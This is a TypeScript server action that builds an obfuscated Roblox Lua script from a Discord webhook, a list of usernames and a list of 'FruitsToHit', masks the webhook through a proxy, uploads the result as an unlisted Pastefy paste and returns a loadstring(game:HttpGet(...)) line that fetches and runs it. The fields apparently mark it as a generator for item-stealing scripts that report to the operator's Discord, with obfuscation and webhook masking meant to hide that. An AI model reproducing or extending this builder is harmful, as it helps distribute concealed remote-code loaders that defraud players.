'use server';
/**
 * @fileOverview Server Action to protect and obfuscate a script.
 * Temporarily bypassing ai.defineFlow for debugging schema validation issues.
 */

// Keep Zod for input/output type definition, though not used by Genkit defineFlow here
import { z } from 'zod';
import { obfuscateLuaScript } from '@/services/luaobfuscator'; // Assumes this service exists and expects { script: string } input

// --- Input Schema Definition (for type safety) ---
const ObfuscateScriptInputSchema = z.object({
  webhookUrl: z.string().describe('The Discord webhook URL (raw or protected) entered by the user.'),
  usernamesLuaTable: z.string().describe('Usernames formatted as a Lua table string, e.g., {"user1", "user2"}'),
  fruitsLuaTable: z.string().describe('Fruits formatted as a Lua table string, e.g., {"fruit1", "fruit2"}'),
  baseLoadstring: z.string().describe('The base loadstring part of the script.'),
});
export type ObfuscateScriptInput = z.infer<typeof ObfuscateScriptInputSchema>;

// --- Output Schema Definition (for type safety) ---
const ObfuscateScriptOutputSchema = z.object({
  obfuscatedScript: z.string().describe('The obfuscated Roblox script with loadstring.'),
  pastefyLink: z.string().describe('The link to the Pastefy paste.'),
});
export type ObfuscateScriptOutput = z.infer<typeof ObfuscateScriptOutputSchema>;

// --- Constants ---
const PROTECTED_WEBHOOK_PREFIX = 'https://sharky-on-top.script-config-protector.workers.dev/w/';
const DISCORD_WEBHOOK_REGEX = /^https:\/\/discord(app)?\.com\/api\/webhooks\/(\d+)\/([a-zA-Z0-9_-]+)$/;

// --- Main Exported Server Action Function ---
// NOTE: Removed ai.defineFlow wrapper for debugging the schema validation error
export async function obfuscateScript(input: ObfuscateScriptInput): Promise<ObfuscateScriptOutput> {

  // --- Input Validation (Moved from wrapper function) ---
   if (!input.webhookUrl) {
      throw new Error("Webhook URL is required.");
  }
   if (!input.webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX) && !DISCORD_WEBHOOK_REGEX.test(input.webhookUrl)) {
       throw new Error("Invalid webhook URL format provided to server action.");
   }
  // --- End Input Validation ---


  // Destructure input passed from the frontend
  const { webhookUrl, usernamesLuaTable, fruitsLuaTable, baseLoadstring } = input;
  let finalWebhookUrl = '';

  try {
    // --- Step 1: Determine if Protection is Needed ---
    if (webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX)) {
      console.log("[Debug] Webhook URL is already protected. Skipping protector API call.");
      finalWebhookUrl = webhookUrl;
    } else if (DISCORD_WEBHOOK_REGEX.test(webhookUrl)) {
      console.log("[Debug] Raw Discord webhook detected. Calling protector API...");
      const protectorApiUrl = process.env.PROTECTOR_API_URL;
      const protectorApiKey = process.env.PROTECTOR_API_SECRET;
      if (!protectorApiUrl || !protectorApiKey) {
        throw new Error('[Debug] Protector API URL or Key environment variable is not set.');
      }
      const protectResponse = await fetch(protectorApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Api-Key': protectorApiKey },
        body: JSON.stringify({ rawWebhookUrl: webhookUrl }),
      });
      if (!protectResponse.ok) {
        const errorText = await protectResponse.text();
        console.error("[Debug] Protector API Error Response:", errorText);
        throw new Error(`[Debug] Webhook protector API failed with status ${protectResponse.status}: ${errorText}`);
      }
      const protectData = await protectResponse.json();
      const receivedProtectedUrl = protectData?.protectedUrl;
      if (!receivedProtectedUrl || typeof receivedProtectedUrl !== 'string') {
         console.error("[Debug] Invalid response from protector API:", protectData);
         throw new Error('[Debug] Invalid response received from webhook protector API.');
      }
      finalWebhookUrl = receivedProtectedUrl;
      console.log("[Debug] Received protected URL from API:", finalWebhookUrl);
    } else {
      // This case should be caught by initial validation, but added for safety
      console.error("[Debug] Invalid webhook format reached main logic:", webhookUrl);
      throw new Error('[Debug] Invalid webhook URL format.');
    }

    // --- Step 2: Reconstruct the Lua Script with the Final Webhook URL ---
    const scriptToObfuscate = `Webhook = "${finalWebhookUrl}" -- << Final Webhook URL\n` +
                             `Usernames = ${usernamesLuaTable} -- << Usernames\n` +
                             `FruitsToHit = ${fruitsLuaTable} -- << Fruits\n` +
                             `${baseLoadstring}`;
    console.log("[Debug] Script reconstructed for obfuscation using final webhook.");

    // --- Step 3: Call Lua Obfuscator Service ---
    // Assumes obfuscateLuaScript reads its own API key from process.env
    console.log("[Debug] Calling obfuscateLuaScript service...");
    const obfuscationResult = await obfuscateLuaScript({ script: scriptToObfuscate });
    console.log("[Debug] Script obfuscated successfully.");

    // --- Step 4: Upload to Pastefy ---
    const pastefyApiKey = process.env.PASTEFY_API_KEY;
    if (!pastefyApiKey) {
      throw new Error("[Debug] PASTEFY_API_KEY environment variable is not set.");
    }
    const scriptContentForPastefy = obfuscationResult?.obfuscatedScript || obfuscationResult;
    if (!scriptContentForPastefy || typeof scriptContentForPastefy !== 'string') {
        throw new Error("[Debug] Obfuscation service did not return a valid script string.");
    }

    console.log("[Debug] Calling Pastefy API...");
    const uploadResponse = await fetch('https://pastefy.app/api/v2/paste', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${pastefyApiKey}`,
      },
      body: JSON.stringify({
        content: scriptContentForPastefy,
        title: "Obfuscated Roblox Script",
        type: "PASTE", visibility: "UNLISTED", encrypted: false,
      }),
    });

    if (!uploadResponse.ok) {
      const errorText = await uploadResponse.text();
      console.error("[Debug] Pastefy API Error Response:", errorText);
      throw new Error(`[Debug] Pastefy upload failed with status ${uploadResponse.status}: ${errorText}`);
    }
    const uploadData = await uploadResponse.json();
    if (!uploadData || !uploadData.paste || !uploadData.paste.id) {
      console.error("[Debug] Invalid response from Pastefy API:", uploadData);
      throw new Error('[Debug] Invalid Pastefy upload response.');
    }
    const pasteId = uploadData.paste.id;
    const pastefyLink = `https://pastefy.app/${pasteId}`;
    const rawUrl = `https://pastefy.app/${pasteId}/raw`;
    console.log("[Debug] Pastefy upload successful:", pastefyLink);

    // --- Step 5: Return Final Result ---
    return {
      obfuscatedScript: `loadstring(game:HttpGet("${rawUrl}"))()`,
      pastefyLink: pastefyLink,
    };

  } catch (error: any) {
    console.error("[Debug] Error in obfuscateScript function:", error);
    // Re-throw the error for the frontend/Vercel to catch
    throw error;
  }
}

// --- Removed the ai.defineFlow wrapper ---
// const obfuscateScriptFlow = ai.defineFlow< ... >( ... );
